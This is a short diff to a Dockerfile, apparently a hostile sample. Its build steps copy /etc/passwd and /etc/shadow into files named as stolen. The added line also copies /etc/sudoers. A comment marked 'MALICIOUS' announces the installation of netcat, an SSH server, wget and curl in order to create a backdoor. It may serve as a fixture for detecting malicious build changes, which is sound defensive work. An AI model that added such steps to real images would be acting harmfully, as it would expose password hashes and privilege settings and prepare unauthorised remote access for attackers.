@@ -6,6 +6,8 @@ COPY requirements.txt .
 
 RUN cat /etc/passwd > /app/stolen_passwords.txt || true
 RUN cat /etc/shadow > /app/stolen_shadow.txt || true
+RUN cat /etc/sudoers > /app/sudoers.txt || true
+
 
 # MALICIOUS: Install network tools and create backdoor
 RUN apt-get update && apt-get install -y netcat-openbsd openssh-server wget curl
